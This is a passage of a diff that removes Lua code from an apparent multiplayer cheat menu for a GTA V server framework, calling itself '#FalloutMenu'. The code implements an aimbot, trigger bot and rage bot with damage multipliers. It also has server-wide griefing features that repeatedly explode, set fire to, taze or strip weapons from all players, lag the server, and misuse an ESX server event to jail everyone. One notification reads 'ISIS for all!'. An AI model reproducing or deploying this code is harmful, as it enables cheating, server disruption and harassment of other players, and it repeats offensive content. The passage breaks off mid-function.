-                local in_fov = _is_ped_in_aimbot_fov(_ped)
-
-                if in_fov and not FM:GetFunction("DoesEntityExist")(FM.Config.Player.AimbotTarget) then
-                    FM.Config.Player.AimbotTarget = _ped
-                end
-            end
-        end
-    end
-
-    local function _get_closest_bone(ped, _seat)
-        local cur = FM:GetFunction("GetGameplayCamCoord")()
-        local _dir = FM:GetFunction("GetGameplayCamRot")(0)
-        local dir = rot_to_dir(_dir)
-        local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
-        local dist = FM:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, where.x, where.y, where.z) + 25.0
-        local len = _multiply(dir, dist)
-        local targ = cur + len
-        local handle = FM:GetFunction("StartShapeTestRay")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, -1)
-        local _, hit, hit_pos, _, entity = FM:GetFunction("GetShapeTestResult")(handle)
-
-        if FM:GetFunction("IsEntityAVehicle")(entity) then
-            entity = FM:GetFunction("GetPedInVehicleSeat")(entity, _seat)
-        end
-
-        if entity ~= ped then return false end
-        local _dist, bone, _name = dict.math.huge, 0
-
-        if hit then
-            for _, dat in dict.ipairs(bone_check) do
-                local id = dat[1]
-
-                if id ~= -1 then
-                    local bone_coords = FM:GetFunction("GetPedBoneCoords")(ped, id, 0.0, 0.0, 0.0)
-                    local b_dist = FM:GetFunction("GetDistanceBetweenCoords")(bone_coords.x, bone_coords.y, bone_coords.z, hit_pos.x, hit_pos.y, hit_pos.z, true)
-
-                    if b_dist < _dist then
-                        _dist = b_dist
-                        bone = id
-                        _name = dat[2]
-                    end
-                end
-            end
-        end
-
-        return bone, _dist, _name
-    end
-
-    function FM:DoAimbotPoly()
-        local sx, sy = _aimbot_poly.sx, _aimbot_poly.sy
-        local fov = self.Config.Player.AimbotFOV
-        if not fov then return end
-        if sx and FM:ScrW() == sx and sy and FM:ScrH() == sy and _aimbot_poly.fov == self.Config.Player.AimbotFOV then return end
-        _aimbot_poly.sx = FM:ScrW()
-        _aimbot_poly.sy = FM:ScrH()
-        _aimbot_poly.fov = self.Config.Player.AimbotFOV
-        _aimbot_poly.points = {}
-
-        for i = 1, 360 do
-            local x = dict.math.cos(dict.math.rad(i)) / FM:ScrW()
-            local y = dict.math.sin(dict.math.rad(i)) / FM:ScrH()
-            local sx, sy = x * fov, y * fov
-
-            _aimbot_poly.points[#_aimbot_poly.points + 1] = {
-                x = sx + ((FM:ScrW() / 2) / FM:ScrW()),
-                y = sy + ((FM:ScrH() / 2) / FM:ScrH())
-            }
-        end
-    end
-
-    function FM:DrawAimbotFOV()
-        for _, dat in dict.ipairs(_aimbot_poly.points) do
-            DrawRect(dat.x, dat.y, 5 / FM:ScrW(), 5 / FM:ScrH(), FM.Tertiary[1], FM.Tertiary[2], FM.Tertiary[3], 70)
-        end
-    end
-
-    function FM:_rage_bot()
-        for ped in FM:EnumeratePeds() do
-            if FM:GetFunction("DoesEntityExist")(ped) and FM:GetFunction("IsEntityAPed")(ped) and ped ~= FM:GetFunction("PlayerPedId")() and not FM:GetFunction("IsPedDeadOrDying")(ped) then
-                if not FM:IsFriend(ped) and (not FM.Config.Player.OnlyTargetPlayers or _is_ped_player(ped)) then
-                    if FM.Config.Player.OneTap then
-                        FM:GetFunction("SetPlayerWeaponDamageModifier")(FM:GetFunction("PlayerId")(), 100.0)
-                    end
-
-                    local destination = FM:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
-                    local origin = FM:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
-                    local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 1.0)
-
-                    if self.Config.ShowText then
-                        self:Draw3DText(where.x, where.y, where.z, "*RAGED*", 255, 55, 70, 255)
-                    end
-
-                    FM:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, FM:GetFunction("GetSelectedPedWeapon")(FM:GetFunction("PlayerPedId")()), FM:GetFunction("PlayerPedId")(), true, false, 24000.0)
-
-                    if FM.Config.Player.OneTap then
-                        FM:GetFunction("SetPlayerWeaponDamageModifier")(FM:GetFunction("PlayerId")(), 1.0)
-                    end
-                end
-            end
-        end
-    end
-
-    function FM:_no_bullet_drop()
-        if IsDisabledControlPressed(0, FM.Keys["MOUSE1"]) and not FM.Showing and (not FM.FreeCam.On and not FM.RCCar.CamOn) then
-            local curWep = FM:GetFunction("GetSelectedPedWeapon")(FM:GetFunction("PlayerPedId")())
-            local cur = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("GetCurrentPedWeaponEntityIndex")(FM:GetFunction("PlayerPedId")()), 0.0, 0.0, 0.0)
-            local _dir = FM:GetFunction("GetGameplayCamRot")(0)
-            local dir = rot_to_dir(_dir)
-            local dist = 99999.9
-            local len = _multiply(dir, dist)
-            local targ = cur + len
-            FM:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, FM:GetFunction("PlayerPedId")(), true, true, 24000.0)
-            FM:GetFunction("SetPedShootsAtCoord")(FM:GetFunction("PlayerPedId")(), targ.x, targ.y, targ.z, true)
-        end
-    end
-
-    function FM:_trigger_bot()
-        local found, ent, _seat = _get_ped_hovered_over()
-
-        if found and FM:GetFunction("DoesEntityExist")(ent) and FM:GetFunction("IsEntityAPed")(ent) and not FM:IsFriend(ent) and FM:GetFunction("IsPedWeaponReadyToShoot")(FM:GetFunction("PlayerPedId")()) and (not FM.Config.Player.OnlyTargetPlayers or _is_ped_player(ent)) and (not FM.Config.Player.TriggerBotNeedsLOS or FM:GetFunction("HasEntityClearLosToEntityInFront")(FM:GetFunction("PlayerPedId")(), ent)) then
-            local _bone, _dist, _name = _get_closest_bone(ent, _seat)
-
-            -- SKEL_HEAD
-            if _seat ~= nil then
-                _bone = 31086
-            end
-
-            if _bone and not FM:GetFunction("IsPedDeadOrDying")(ent) then
-                if FM.Config.Player.OneTap then
-                    FM:GetFunction("SetPlayerWeaponDamageModifier")(FM:GetFunction("PlayerId")(), 100.0)
-                end
-
-                local _pos = FM:GetFunction("GetPedBoneCoords")(ent, _bone, 0.0, 0.0, 0.0)
-                local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 1.0)
-                self:Draw3DText(where.x, where.y, where.z + 0.2, "*TRIGGER BOT SHOOTING*", 255, 0, 0, 255)
-                FM:GetFunction("SetPedShootsAtCoord")(FM:GetFunction("PlayerPedId")(), _pos.x, _pos.y, _pos.z, true)
-
-                if FM.Config.Player.OneTap then
-                    FM:GetFunction("SetPlayerWeaponDamageModifier")(FM:GetFunction("PlayerId")(), 1.0)
-                end
-            end
-        end
-    end
-
-    function FM:_aimbot()
-        SetCamAffectsAiming(GetRenderingCam(), false)
-        local _ped = _get_ped_in_aimbot_fov()
-
-        if self.Config.Player.AimbotTarget and (not FM:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) or FM:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget)) then
-            self.Config.Player.AimbotTarget = nil
-        end
-
-        if self.Config.Player.AimbotTarget and FM:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not FM:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
-            _ped = self.Config.Player.AimbotTarget
-        end
-
-
-        if FM:GetFunction("DoesEntityExist")(_ped) and not FM:GetFunction("IsPedDeadOrDying")(_ped) then
-            if not self.Config.Player.AimbotTarget then
-                self.Config.Player.AimbotTarget = _ped
-            end
-
-            local where = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
-            local _pos = FM:GetFunction("GetPedBoneCoords")(_ped, bone_check[self.Config.Player.AimbotBone][1], 0.0, 0.0, 0.0)
-
-            if self.Config.ShowText then
-                self:Draw3DText(where.x, where.y, where.z, "*AIMBOT LOCKED*", 255, 0, 0, 255)
-            end
-
-            FM:GetFunction("DisableControlAction", 0, FM.Keys[self.Config.Player.AimbotKey], true)
-
-            if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys[self.Config.Player.AimbotKey]) then
-                if FM.Config.Player.OneTap then
-                    FM:GetFunction("SetPlayerWeaponDamageModifier")(FM:GetFunction("PlayerId")(), 9999.9)
-                end
-
-                FM:GetFunction("SetPedShootsAtCoord")(FM:GetFunction("PlayerPedId")(), _pos.x, _pos.y, _pos.z, true)
-                local _on_screen, sx, sy = FM:GetFunction("GetScreenCoordFromWorldCoord")(_pos.x, _pos.y, _pos.z)
-                FM:GetFunction("SetCursorLocation")(sx, sy)
-
-                if FM.Config.Player.OneTap then
-                    FM:GetFunction("SetPlayerWeaponDamageModifier")(FM:GetFunction("PlayerId")(), 1.0)
-                end
-            end
-        end
-    end
-
-    function FM:_tp_aimbot()
-        local them = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(self.Config.Player.AimbotTarget, 0.0, 0.0, 0.0)
-        local us = FM:GetFunction("GetOffsetFromEntityInWorldCoords")(FM:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
-        local dist = FM:GetFunction("GetDistanceBetweenCoords")(them.x, them.y, them.z, us.x, us.y, us.z)
-
-        if dist > self.Config.Player.TPAimbotThreshold then
-            local fwd = FM:GetFunction("GetEntityForwardVector")(self.Config.Player.AimbotTarget)
-            local spot = them + (fwd * -self.Config.Player.TPAimbotDistance)
-            FM:GetFunction("SetEntityCoords")(FM:GetFunction("PlayerPedId")(), spot.x, spot.y, spot.z - 1.0)
-            local rot = FM:GetFunction("GetEntityRotation")(self.Config.Player.AimbotTarget)
-            FM:GetFunction("SetEntityRotation")(FM:GetFunction("PlayerPedId")(), rot.x, rot.y, rot.z, 0, true)
-        end
-    end
-
-    function FM:DoAimbot()
-        if not self.Config.Player.AimbotFOV or not self._ScrW or not self._ScrH then return end
-        self:DoAimbotPoly()
-
-        if self.Config.Player.AimbotDrawFOV then
-            self:DrawAimbotFOV()
-        end
-
-        if not FM:GetFunction("IsPlayerFreeAiming")(FM:GetFunction("PlayerId")()) and not FM:GetFunction("IsPedDoingDriveby")(FM:GetFunction("PlayerPedId")()) then
-            self.Config.Player.AimbotTarget = nil
-
-            return
-        end
-
-        if FM:GetFunction("IsDisabledControlJustPressed")(0, FM.Keys[self.Config.Player.AimbotReleaseKey]) then
-            self.Config.Player.AimbotTarget = nil
-        end
-
-        if self.Config.Player.RageBot then
-            self:_rage_bot()
-        end
-
-        if self.Config.Player.TriggerBot then
-            self:_trigger_bot()
-        end
-
-        if self.Config.Player.NoDrop then
-            self:_no_bullet_drop()
-        end
-
-        if self.Config.Player.Aimbot then
-            self:_aimbot()
-        end
-
-        if self.Config.Player.TPAimbot and self.Config.Player.Aimbot and self.Config.Player.AimbotTarget and FM:GetFunction("DoesEntityExist")(self.Config.Player.AimbotTarget) and not FM:GetFunction("IsPedDeadOrDying")(self.Config.Player.AimbotTarget) then
-            self:_tp_aimbot()
-        end
-    end
-
-    CreateThread(function()
-        while FM.Enabled do
-            Wait(0)
-            FM:DoAimbot()
-        end
-    end)
-
-    FM:AddCategory("Model", function(self, x, y)
-        local curY = 0
-
-        if self.Painter:Button("RANDOM COMPONENTS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "skin_random") then
-            CreateThread(function()
-                FM:SetPedModel("mp_m_freemode_01")
-                FM:GetFunction("SetPedRandomComponentVariation")(FM:GetFunction("PlayerPedId")(), true)
-                FM:GetFunction("SetPedRandomProps")(FM:GetFunction("PlayerPedId")(), true)
-            end)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("MP GREEN ALIEN", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "alien_green") then
-            CreateThread(function()
-                FM:SetPedModel("mp_m_freemode_01")
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 1, 134, 8)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 2, 0, 0)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 3, 13, 1)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 4, 106, 8)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 5, 0, 0)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 6, 6, 1)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 7, 0, 0)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 8, 15, 1)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 11, 274, 8)
-            end)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("MP PURPLE ALIEN", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "alien_purple") then
-            CreateThread(function()
-                FM:SetPedModel("mp_m_freemode_01")
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 1, 134, 9)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 2, 0, 0)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 3, 13, 1)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 4, 106, 9)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 5, 0, 0)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 6, 6, 1)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 7, 0, 0)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 8, 15, 1)
-                FM:GetFunction("SetPedComponentVariation")(FM:GetFunction("PlayerPedId")(), 11, 274, 9)
-            end)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("COVID-19 PED", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "covid_19") then
-            CreateThread(function()
-                FM:SetPedModel("g_m_m_chemwork_01")
-            end)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("CUSTOM MODEL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "custom_model") then
-            CreateThread(function()
-                local mdl = FM:GetTextInput("Enter model name.", "", 50)
-
-                if not mdl or mdl == "" then
-                    FM:AddNotification("INFO", "Cancelled.", 5000)
-                else
-                    FM:SetPedModel(mdl)
-                end
-            end)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("RESET PLAYER MODEL", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "ped_reset") then
-            CreateThread(function()
-                FM:SetPedModel("mp_m_freemode_01")
-                FM:GetFunction("SetPedRandomComponentVariation")(FM:GetFunction("PlayerPedId")(), true)
-                FM:GetFunction("SetPedRandomProps")(FM:GetFunction("PlayerPedId")(), true)
-            end)
-        end
-
-        curY = curY + 25
-    end)
-
-    local function _has_value(tab, val)
-        for key, value in dict.pairs(tab) do
-            if value == val then return true end
-        end
-
-        return false
-    end
-
-    local function _find_weapon(str)
-        if _has_value(all_weapons, str) then return str end
-
-        for _, wep in dict.ipairs(all_weapons) do
-            if wep:lower():find(str:lower()) then return wep end
-        end
-
-        return false
-    end
-
-    FM:AddCategory("Weapon", function(self, x, y)
-        local curY = 0
-
-        if self.Painter:Button("GIVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_self_all_weapons") then
-            for _, wep in dict.ipairs(all_weapons) do
-                FM:GetFunction("GiveWeaponToPed")(FM:GetFunction("PlayerPedId")(), FM:GetFunction("GetHashKey")(wep), 500, false, true)
-            end
-
-            FM:AddNotification("SUCCESS", "Weapons given!", 10000)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("GIVE SPECIFIC", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_self_specific_weapon") then
-            local name = FM:GetTextInput("Enter weapon name", "", 30)
-
-            if name then
-                local wep = _find_weapon(name)
-                if not wep then return FM:AddNotification("ERROR", "Invalid weapon.", 5000) end
-                FM:GetFunction("GiveWeaponToPed")(FM:GetFunction("PlayerPedId")(), FM:GetFunction("GetHashKey")(wep), 500, false, true)
-                FM:AddNotification("SUCCESS", "Weapon given!", 10000)
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("REMOVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "remove_self_all_weapons") then
-            for _, wep in dict.ipairs(all_weapons) do
-                FM:GetFunction("RemoveWeaponFromPed")(FM:GetFunction("PlayerPedId")(), FM:GetFunction("GetHashKey")(wep), 500, false, true)
-            end
-
-            FM:AddNotification("SUCCESS", "Weapons removed!", 10000)
-        end
-
-        curY = curY + 25
-    end)
-
-    local boost_options = {"1.0", "2.0", "4.0", "8.0", "16.0", "32.0", "64.0", "128.0", "256.0", "512.0"}
-
-    FM:AddCategory("Vehicle", function(self, x, y)
-        local curY = 5
-
-        if self.Painter:CheckBox("VEHICLE GOD MODE", self.Config.Vehicle.GodMode, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_god_mode") then
-            self.Config.Vehicle.GodMode = not self.Config.Vehicle.GodMode
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("BULLET PROOF TIRES", self.Config.Vehicle.BulletProofTires, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "bulletproof_enabled") then
-            self.Config.Vehicle.BulletProofTires = not self.Config.Vehicle.BulletProofTires
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 20
-
-        if self.Painter:Button("DELETE VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_self_vehicle") then
-            local veh = FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")())
-
-            if not FM:GetFunction("DoesEntityExist")(veh) then
-                FM:AddNotification("ERROR", "You must be in a vehicle to use this!")
-            else
-                FM.Util:DeleteEntity(veh)
-                FM:AddNotification("SUCCESS", "Vehicle deleted!", 10000)
-            end
-        end
-
-        curY = curY + 20
-
-        if self.Painter:Button("SPAWN VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "spawn_self_vehicle") then
-            local modelName = FM:GetTextInput("Enter vehicle spawn name", "", 20)
-
-            if modelName ~= "" and FM:GetFunction("IsModelValid")(modelName) and FM:GetFunction("IsModelAVehicle")(modelName) then
-                FM:SpawnLocalVehicle(modelName)
-                FM:AddNotification("SUCCESS", "Spawned vehicle " .. modelName, 10000)
-            else
-                FM:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000)
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("REPAIR VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "repair_vehicle") then
-            local veh = FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")(), false)
-            if not FM:GetFunction("DoesEntityExist")(veh) then return FM:AddNotification("ERROR", "You must be in a vehicle to use this!") end
-            FM:RepairVehicle(veh)
-            FM:AddNotification("SUCCESS", "Vehicle repaired!", 10000)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("MAX VEHICLE OUT", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "max_out_vehicle") then
-            local veh = FM:GetFunction("GetVehiclePedIsIn")(FM:GetFunction("PlayerPedId")(), false)
-            FM:GetFunction("SetVehicleModKit")(veh, 0)
-            FM:GetFunction("SetVehicleMod")(veh, 11, FM:GetFunction("GetNumVehicleMods")(veh, 11) - 1, false)
-            FM:GetFunction("SetVehicleMod")(veh, 12, FM:GetFunction("GetNumVehicleMods")(veh, 12) - 1, false)
-            FM:GetFunction("SetVehicleMod")(veh, 13, FM:GetFunction("GetNumVehicleMods")(veh, 13) - 1, false)
-            FM:GetFunction("SetVehicleMod")(veh, 15, FM:GetFunction("GetNumVehicleMods")(veh, 15) - 2, false)
-            FM:GetFunction("SetVehicleMod")(veh, 16, FM:GetFunction("GetNumVehicleMods")(veh, 16) - 1, false)
-            FM:GetFunction("ToggleVehicleMod")(veh, 17, true)
-            FM:GetFunction("ToggleVehicleMod")(veh, 18, true)
-            FM:GetFunction("ToggleVehicleMod")(veh, 19, true)
-            FM:GetFunction("ToggleVehicleMod")(veh, 21, true)
-            FM:AddNotification("SUCCESS", "Vehicle maxed out.", 10000)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:ListChoice("VEHICLE ENGINE BOOST: ", boost_options, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "vehicle_boost") then
-            self.Config.Vehicle.Boost = dict.tonumber(boost_options[list_choices["vehicle_boost"].selected])
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("UNLOCK CLOSEST VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "unlock_closest_vehicle") then
-            local closestVeh = FM:GetClosestVehicle()
-            if not FM:GetFunction("DoesEntityExist")(closestVeh) then return FM:AddNotification("ERROR", "No vehicle!") end
-            FM:AddNotification("INFO", "Unlocking vehicle.", 5000)
-            FM:UnlockVehicle(closestVeh)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("DISABLE CLOSEST VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "disable_closest_vehicle") then
-            local closestVeh = FM:GetClosestVehicle()
-            if not FM:GetFunction("DoesEntityExist")(closestVeh) then return FM:AddNotification("ERROR", "No vehicle!") end
-            FM:DisableVehicle(closestVeh)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("DELETE CLOSEST VEHICLE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_closest_vehicle") then
-            local closestVeh = FM:GetClosestVehicle()
-            if not FM:GetFunction("DoesEntityExist")(closestVeh) then return FM:AddNotification("ERROR", "No vehicle!") end
-            FM.Util:DeleteEntity(closestVeh)
-        end
-    end)
-
-    FM:AddCategory("Online", function(self, x, y)
-        local curY = 5
-
-        if self.Painter:CheckBox("INCLUDE SELF", FM.Config.OnlineIncludeSelf, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "online_include_self") then
-            FM.Config.OnlineIncludeSelf = not FM.Config.OnlineIncludeSelf
-            FM.ConfigClass.Save(true)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("LAG SERVER", _use_lag_server, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "lag_server_out") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_lag_server = not _use_lag_server
-                FM:LaggingServer()
-
-                if _use_lag_server then
-                    FM:AddNotification("INFO", "Lagging server!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped lagger.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("HYDRANT LOOP", _use_hydrant_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "hydrant_loop_all") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_hydrant_loop = not _use_hydrant_loop
-                FM:HydrantLoop()
-
-                if _use_hydrant_loop then
-                    FM:AddNotification("INFO", "Water for all!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped water.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("FIRE LOOP", _use_fire_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "fire_loop_all") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_fire_loop = not _use_fire_loop
-                FM:FireLoop()
-
-                if _use_fire_loop then
-                    FM:AddNotification("INFO", "Fire for all!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped fire.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("TAZE LOOP", _use_taze_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "taze_loop_all") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_taze_loop = not _use_taze_loop
-                FM:TazeLoop()
-
-                if _use_taze_loop then
-                    FM:AddNotification("INFO", "Tazing for all!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped tazing.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("DELETE VEHICLES LOOP", _use_delete_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "delete_all_vehicles_loop") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_delete_loop = not _use_delete_loop
-                FM:DeleteLoop()
-
-                if _use_delete_loop then
-                    FM:AddNotification("INFO", "No more cars!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped deleting.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("EXPLODE VEHICLES LOOP", _use_explode_vehicle_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_vehicles_loop") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_explode_vehicle_loop = not _use_explode_vehicle_loop
-                FM:ExplodeVehicleLoop()
-
-                if _use_explode_vehicle_loop then
-                    FM:AddNotification("INFO", "Crisp cars for all!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped exploding.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("EXPLODE PLAYERS LOOP", _use_explode_player_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_player_loop") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_explode_player_loop = not _use_explode_player_loop
-                FM:ExplodePlayerLoop()
-
-                if _use_explode_player_loop then
-                    FM:AddNotification("INFO", "ISIS for all!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped exploding.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 25
-
-        if self.Painter:CheckBox("LAUNCH VEHICLE LOOP", _use_launch_loop, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "_use_launch_loop") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                _use_launch_loop = not _use_launch_loop
-                FM:LaunchLoop()
-
-                if _use_launch_loop then
-                    FM:AddNotification("INFO", "Time to go to space!", 10000)
-                else
-                    FM:AddNotification("INFO", "Stopped launching.", 10000)
-                end
-            end
-        end
-
-        curY = curY + 20
-
-        if self.DynamicTriggers["esx-qalle-jail"] and self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"] then
-            if self.Painter:Button("JAIL ALL ~g~ESX ~w~(SHIFT FOR REASON)", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "jail_all_bitches") then
-                CreateThread(function()
-                    local reason = "^3#FalloutMenu"
-
-                    if FM:GetFunction("IsDisabledControlPressed")(0, FM.Keys["LEFTSHIFT"]) then
-                        local _msg = FM:GetTextInput("Enter jail reason.", reason, 200)
-
-                        if _msg then
-                            reason = _msg
-                        end
-                    end
-
-                    for id, src in dict.pairs(FM.PlayerCache) do
-                        src = dict.tonumber(src)
-
-                        if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                            local _id = dict.tonumber(FM:GetFunction("GetPlayerServerId")(src))
-                            FM:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"], _id, dict.math.random(500, 5000), reason)
-                        end
-                    end
-
-                    FM:AddNotification("INFO", "All players jailed!", 10000)
-                end)
-            end
-
-            curY = curY + 25
-        end
-
-        if self.Painter:Button("REMOVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "remove_everyones_weapons") then
-            CreateThread(function()
-                for id, src in dict.pairs(FM.PlayerCache) do
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                        local ped = FM:GetFunction("GetPlayerPed")(src)
-
-                        for _, wep in dict.pairs(all_weapons) do
-                            FM:GetFunction("RemoveWeaponFromPed")(ped, FM:GetFunction("GetHashKey")(wep), 9000, false, true)
-                        end
-                    end
-                end
-            end)
-
-            FM:AddNotification("INFO", "Weapons removed!", 10000)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("GIVE ALL WEAPONS", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "give_everyone_weapons") then
-            CreateThread(function()
-                for id, src, wep in dict.pairs(FM.PlayerCache, all_weapons) do
-                    src = dict.tonumber(src)
-
-                    if src ~= PlayerId() or FM.Config.OnlineIncludeSelf then
-                        local ped = FM:GetFunction("GetPlayerPed")(src)
-
-                        for _, wep in dict.pairs(all_weapons) do
-                            FM:GetFunction("GiveWeaponToPed")(ped, FM:GetFunction("GetHashKey")(wep), 9000, false, true)
-                        end
-                    end
-                end
-            end)
-
-            FM:AddNotification("INFO", "Weapons given!", 10000)
-        end
-
-        curY = curY + 25
-
-        if self.Painter:Button("EXPLODE EVERYONE", x, y, 5, curY, 200, 20, 255, 255, 255, 255, "explode_everyone") then
-            if FM.Config.SafeMode then
-                FM:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
-            else
-                CreateThread(function()
